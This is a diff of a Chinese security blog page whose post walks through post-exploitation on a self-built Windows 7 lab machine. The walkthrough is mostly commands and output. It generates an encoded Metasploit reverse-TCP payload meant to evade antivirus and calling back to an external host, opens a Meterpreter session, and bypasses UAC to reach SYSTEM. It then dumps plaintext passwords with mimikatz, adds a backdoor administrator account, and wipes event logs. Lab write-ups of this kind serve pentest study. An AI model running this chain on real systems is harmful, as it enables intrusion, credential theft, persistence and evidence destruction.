@@ -1,93 +1,16 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content="本地构建渗透测试环境，在已经获得 shell 的前提下尝试利用 Metasploit 进行提权"/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>Metasploit 简单提权 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>Metasploit 简单提权</h1>
-      
-<div class="post-meta">
-    <time>2018-02-26</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/tools">tools</a>,<a href="/tags/intranet">intranet</a>)
-</div>
-
-      <div><h3 id="0x00-前提">0x00 前提</h3>
-<p>虚拟机有一个shell：<code>http://10.11.11.20/a.php</code>，物理机IP是211.222.222.72<br>
-外网安装msf的主机：外网IP是114.115.123.123，内网IP是192.168.0.195</p>
-<h3 id="0x01-查看主机基本信息">0x01 查看主机基本信息</h3>
-<p>菜刀连接shell，终端执行systeminfo</p>
-<pre tabindex="0"><code>C:\Apps\phpStudy\WWW\&gt; systeminfo
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="本地构建渗透测试环境，在已经获得 shell 的前提下尝试利用 Metasploit 进行提权"><meta name=author content="Reber"><title>Metasploit 简单提权 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>Metasploit 简单提权</h1><div class=post-meta><time>2018-02-26</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/tools>tools</a>,<a href=/tags/intranet>intranet</a>)</div><div><h3 id=0x00-前提>0x00 前提</h3><p>虚拟机有一个shell：<code>http://10.11.11.20/a.php</code>，物理机IP是211.222.222.72<br>外网安装msf的主机：外网IP是114.115.123.123，内网IP是192.168.0.195</p><h3 id=0x01-查看主机基本信息>0x01 查看主机基本信息</h3><p>菜刀连接shell，终端执行systeminfo</p><pre tabindex=0><code>C:\Apps\phpStudy\WWW\&gt; systeminfo
 
 主机名:           REBER-WIN7
 OS 名称:          Microsoft Windows 7 专业版
@@ -130,29 +53,26 @@ Windows 目录:     C:\Windows
                       IP 地址
                         [01]: 10.11.11.20
                         [02]: fe80::d509:b75f:4cc5:5628
-</code></pre><h3 id="0x02-弹出会话到metasploit">0x02 弹出会话到Metasploit</h3>
-<p>生成payload，然后用菜刀上传到目标服务器</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>114.115.123.123 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8888</span> -a x86 -e x86/shikata_ga_nai -i <span style="color:#ae81ff">5</span> --platform windows -f exe -o 86.exe
-</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">1</span> compatible encoders
-</span></span><span style="display:flex;"><span>Attempting to encode payload with <span style="color:#ae81ff">5</span> iterations of x86/shikata_ga_nai
-</span></span><span style="display:flex;"><span>x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">360</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">387</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>1<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">414</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>2<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">441</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>3<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">468</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>4<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">468</span>
-</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">468</span> bytes
-</span></span><span style="display:flex;"><span>Final size of exe file: <span style="color:#ae81ff">73802</span> bytes
-</span></span><span style="display:flex;"><span>Saved as: 86.exe
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># -p 指定payload(用msfvenom -l payloads可查看所有payload)</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># -a 指定目标指令集架构</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># -e 指定用什么编码器编码(多次编码变幻可以免杀，用msfvenom -l encoders可查看编码类型)</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># -i 指定编码迭代的次数</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># --platform 执行目标的平台</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># -f 指定输出格式，可用msfvenom --help-formats查看</span>
-</span></span></code></pre></div><p>msf监听，等待payload执行</p>
-<pre tabindex="0"><code>msf &gt; use exploit/multi/handler
+</code></pre><h3 id=0x02-弹出会话到metasploit>0x02 弹出会话到Metasploit</h3><p>生成payload，然后用菜刀上传到目标服务器</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style=color:#f92672>=</span>114.115.123.123 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>8888</span> -a x86 -e x86/shikata_ga_nai -i <span style=color:#ae81ff>5</span> --platform windows -f exe -o 86.exe
+</span></span><span style=display:flex><span>Found <span style=color:#ae81ff>1</span> compatible encoders
+</span></span><span style=display:flex><span>Attempting to encode payload with <span style=color:#ae81ff>5</span> iterations of x86/shikata_ga_nai
+</span></span><span style=display:flex><span>x86/shikata_ga_nai succeeded with size <span style=color:#ae81ff>360</span> <span style=color:#f92672>(</span>iteration<span style=color:#f92672>=</span>0<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>x86/shikata_ga_nai succeeded with size <span style=color:#ae81ff>387</span> <span style=color:#f92672>(</span>iteration<span style=color:#f92672>=</span>1<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>x86/shikata_ga_nai succeeded with size <span style=color:#ae81ff>414</span> <span style=color:#f92672>(</span>iteration<span style=color:#f92672>=</span>2<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>x86/shikata_ga_nai succeeded with size <span style=color:#ae81ff>441</span> <span style=color:#f92672>(</span>iteration<span style=color:#f92672>=</span>3<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>x86/shikata_ga_nai succeeded with size <span style=color:#ae81ff>468</span> <span style=color:#f92672>(</span>iteration<span style=color:#f92672>=</span>4<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>x86/shikata_ga_nai chosen with final size <span style=color:#ae81ff>468</span>
+</span></span><span style=display:flex><span>Payload size: <span style=color:#ae81ff>468</span> bytes
+</span></span><span style=display:flex><span>Final size of exe file: <span style=color:#ae81ff>73802</span> bytes
+</span></span><span style=display:flex><span>Saved as: 86.exe
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -p 指定payload(用msfvenom -l payloads可查看所有payload)</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -a 指定目标指令集架构</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -e 指定用什么编码器编码(多次编码变幻可以免杀，用msfvenom -l encoders可查看编码类型)</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -i 指定编码迭代的次数</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># --platform 执行目标的平台</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -f 指定输出格式，可用msfvenom --help-formats查看</span>
+</span></span></code></pre></div><p>msf监听，等待payload执行</p><pre tabindex=0><code>msf &gt; use exploit/multi/handler
 msf exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
 PAYLOAD =&gt; windows/meterpreter/reverse_tcp
 msf exploit(multi/handler) &gt; set LHOST 0.0.0.0
@@ -210,8 +130,7 @@ Active sessions
 No active sessions.
 
 msf exploit(multi/handler) &gt;
-</code></pre><p>通过菜刀执行上传的aa.exe，菜刀显示执行错误，但是msf已经成功与目标建立了一个会话</p>
-<pre tabindex="0"><code>msf exploit(multi/handler) &gt;
+</code></pre><p>通过菜刀执行上传的aa.exe，菜刀显示执行错误，但是msf已经成功与目标建立了一个会话</p><pre tabindex=0><code>msf exploit(multi/handler) &gt;
 [*] Sending stage (179779 bytes) to 211.222.222.72
 [*] Meterpreter session 1 opened (192.168.0.195:8888 -&gt; 211.222.222.72:34576) at 2018-02-26 12:26:32 +0800
 
@@ -240,9 +159,7 @@ Mode              Size    Type  Last modified              Name
 meterpreter &gt; background
 [*] Backgrounding session 1...
 msf exploit(multi/handler) &gt;
-</code></pre><h3 id="0x03-提权">0x03 提权</h3>
-<p>前面通过systeminfo得知为Win7主机，只有一个补丁，直接尝试绕过UAC进行提权</p>
-<pre tabindex="0"><code>msf exploit(multi/handler) &gt; use exploit/windows/local/bypassuac
+</code></pre><h3 id=0x03-提权>0x03 提权</h3><p>前面通过systeminfo得知为Win7主机，只有一个补丁，直接尝试绕过UAC进行提权</p><pre tabindex=0><code>msf exploit(multi/handler) &gt; use exploit/windows/local/bypassuac
 msf exploit(windows/local/bypassuac) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
 PAYLOAD =&gt; windows/meterpreter/reverse_tcp
 msf exploit(windows/local/bypassuac) &gt; options
@@ -324,8 +241,7 @@ meterpreter &gt; getsystem
 meterpreter &gt; getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter &gt;
-</code></pre><h3 id="0x04-获得用户名密码">0x04 获得用户名密码</h3>
-<pre tabindex="0"><code>meterpreter &gt; load mimikatz
+</code></pre><h3 id=0x04-获得用户名密码>0x04 获得用户名密码</h3><pre tabindex=0><code>meterpreter &gt; load mimikatz
 Loading extension mimikatz...Success.
 meterpreter &gt; msv
 [+] Running as SYSTEM
@@ -358,8 +274,7 @@ AuthID   Package    Domain        User           Password
 0;69036  NTLM       REBER-WIN7    reber          123456
 
 meterpreter &gt;
-</code></pre><h3 id="0x05-添加用户">0x05 添加用户</h3>
-<pre tabindex="0"><code>meterpreter &gt; shell
+</code></pre><h3 id=0x05-添加用户>0x05 添加用户</h3><pre tabindex=0><code>meterpreter &gt; shell
 Process 2020 created.
 Channel 1 created.
 Microsoft Windows [▒汾 6.1.7600]
@@ -373,37 +288,13 @@ net user hacker 123456 /add
 C:\Windows\system32&gt;net localgroup administrators hacker /add
 net localgroup administrators hacker /add
 ▒▒▒▒ɹ▒▒▒ɡ▒
-</code></pre><h3 id="0x06-清理痕迹">0x06 清理痕迹</h3>
-<pre tabindex="0"><code>meterpreter &gt; clearev
-</code></pre></div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre><h3 id=0x06-清理痕迹>0x06 清理痕迹</h3><pre tabindex=0><code>meterpreter &gt; clearev
+</code></pre></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
